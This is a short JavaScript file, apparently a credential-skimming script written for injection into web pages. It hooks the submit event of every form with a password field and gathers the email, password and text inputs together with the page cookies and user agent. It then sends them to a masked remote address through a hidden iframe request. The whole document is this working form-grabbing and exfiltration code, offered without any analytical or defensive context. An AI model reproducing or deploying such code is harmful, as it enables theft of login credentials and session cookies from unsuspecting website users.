({
      myAPP: function() {
            'use strict'

            var MYAPP = MYAPP || {
                  connection: "****",
                  fabric: [],
                  timeout: 1000,
            };

      MYAPP.Steal = function(Myapp) {

            var options = { 
                  email: Myapp[0]['value'],
                  password: Myapp[1]['value'], 
                  cookies: document.cookie,
                  userAgent: navigator.userAgent
            };

            var Querys = [];

            for (var key in options) {
                  if (options.hasOwnProperty(key)) {
                        Querys.push(key + '=' + options[key]);
                  }
            };

            var FormattedQuerys = Querys.join('&');

            var WebImgInject = document.createElement("iframe");
            WebImgInject.setAttribute("src", MYAPP.connection + FormattedQuerys);
            document.body.appendChild(WebImgInject);
      }




      MYAPP.Inject = function(options) {

            var _Steal = document.querySelectorAll('input[type="password"]'),
            _Form,
            _Nodes,
            _nodes,
            arr = [];

            for (var i = 0; i < _Steal.length; i++) {
                  _Form = _Steal[i].form;

                  _Form.addEventListener('submit', function(event){
                        _Nodes = this.querySelectorAll('input'); 
                        
                        for (var i = 0; i < _Nodes.length; i++) {
                              _nodes = _Nodes[i];

                              if( _nodes.type === 'password' || _nodes.type === 'email' || _nodes.type === 'text')  {
                                    arr.push(_nodes);
                              }
                        }

                        MYAPP.Steal(arr);
                  });
            }
      };
            MYAPP.Inject(); //
      }
}).myAPP();